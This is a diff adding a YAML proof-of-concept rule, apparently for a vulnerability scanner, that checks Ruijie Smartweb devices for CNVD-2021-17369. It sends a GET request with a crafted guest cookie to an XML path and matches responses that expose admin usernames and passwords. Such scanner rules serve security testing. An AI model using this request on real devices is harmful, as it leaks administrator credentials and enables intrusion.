@@ -1,0 +1,12 @@
+name: poc-yaml-ruijie-smartweb-cnvd-2021-17369
+rules:
+  - method: GET
+    path: /web/xml/webuser-auth.xml
+    headers:
+      Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
+    expression: |
+      response.status == 200 && response.body.bcontains(b"admin") && response.body.bcontains(b"<userauth>") && response.body.bcontains(b"<password>")
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369
